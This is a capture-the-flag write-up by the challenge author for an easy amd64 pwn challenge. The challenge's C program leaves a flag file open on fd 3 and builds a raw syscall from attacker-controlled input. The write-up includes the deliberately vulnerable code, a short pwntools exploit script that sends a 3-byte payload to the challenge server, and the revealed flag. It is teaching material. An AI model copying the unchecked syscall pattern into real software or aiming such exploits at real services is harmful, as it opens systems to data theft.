---
title: "Speed Dial"
area: signals-syscalls
role: author
event: friendly-2026
published: 2026-09-29
summary: "strlen(buf) picks the syscall, read()'s return value the fd; 3 bytes turns it into read(3,buf,511), replaying the flag fd through puts()."
techniques: ["raw syscall"]
difficulty: easy
arch: amd64
flag: "Securinets{sp33d_d14l3d_str41ght_1nt0_th3_fl4g_fd}"
---

> Category: **pwn** — Tag: **syscall**
> Flag: `Securinets{sp33d_d14l3d_str41ght_1nt0_th3_fl4g_fd}`

Same family as [[wrong-number]]: no overflow, just a raw `syscall()` fed by
attacker-controlled data. This one adds a twist — the syscall *number*
comes from the buffer's contents, not its length, and the payoff is an
`fd` the program forgot it left open.

## 1. The program

```c
void setup(){
    setbuf(stdout,0); setbuf(stdin,0); setbuf(stderr,0);
    open("flag", O_RDONLY);   // fd 3 — opened, never closed, never used again
}

void vuln(){
    char buf[0x200];
    int n = read(0, buf, sizeof(buf)-1);        // n = bytes WE send
    syscall(strlen(buf), n, buf, sizeof(buf)-1); // number = strlen(buf)!
    puts(buf);
}
```

`setup()` opens `flag` and does nothing else with it — stdin/stdout/stderr
take fds 0-2, so the flag sits on **fd 3** for the rest of the program's
life. `vuln()` then builds a syscall from two different attacker-controlled
values at once:

- the **syscall number** is `strlen(buf)` — the length of the C-string in
  our own input buffer, i.e. up to the first `NUL` byte we sent;
- **arg1** is `n`, the raw byte count `read()` handed back — how many bytes
  we sent, newline included;
- **arg2** is `buf` itself, **arg3** is the fixed `0x1ff` (511).

So the fixed call shape is `syscall(strlen(buf), n, buf, 511)`.

## 2. The syscall

We want a syscall whose signature is `(int, void*, size_t)` so that
`(n, buf, 511)` lines up as real arguments instead of garbage. `read(fd,
buf, count)` — number **0** on x86-64 — is exactly that shape, and if
`n == 3` it becomes `read(3, buf, 511)`: read 511 bytes from **fd 3**, the
flag file `setup()` left sitting open, straight into our own buffer.

Two conditions have to hold at once, from a single `read(0, buf, 0x1ff)` call:

- `n == 3` — we must send exactly 3 bytes total (newline included, `read()`
  counts it).
- `strlen(buf) == 0` — the *first* byte of what we send must be `NUL`, so
  the syscall dispatch reads a length of 0.

Both are satisfiable together: send `\x00`, then two more filler bytes to
make the total exactly 3. A leading `NUL` gives `strlen(buf) == 0` (syscall
`read`) while every byte still counts toward `n`.

## 3. The payload

```python
from pwn import *

r = remote("pwn.friendly-ctf.securinets.tn", 9059)
r.send(b"\x00a\n")          # 3 bytes total: NUL, 'a', '\n' -> n=3, strlen(buf)=0
print(r.recvall(timeout=2).decode())
```

`b"\x00a\n"` is 3 bytes: `n = 3` (arg1 -> fd), and since the buffer starts
with `\x00`, `strlen(buf) = 0` (syscall number -> `read`). The dispatched
call is `read(3, buf, 511)` — it overwrites `buf` with the flag file's
contents, and the very next line, `puts(buf)`, prints them.

## 4. Running it

```
$ python3 solve.py
Securinets{sp33d_d14l3d_str41ght_1nt0_th3_fl4g_fd}
```

## 5. Lesson

`setup()`'s leftover `fd 3` is only dangerous because `vuln()` lets us pick
*both* the syscall number and its first argument from the same
attacker-controlled buffer. A file opened once and never closed is an fd
that outlives its purpose — combined with a raw, unchecked `syscall()`,
that's a standing invitation to read it back through any other fd-shaped
call.
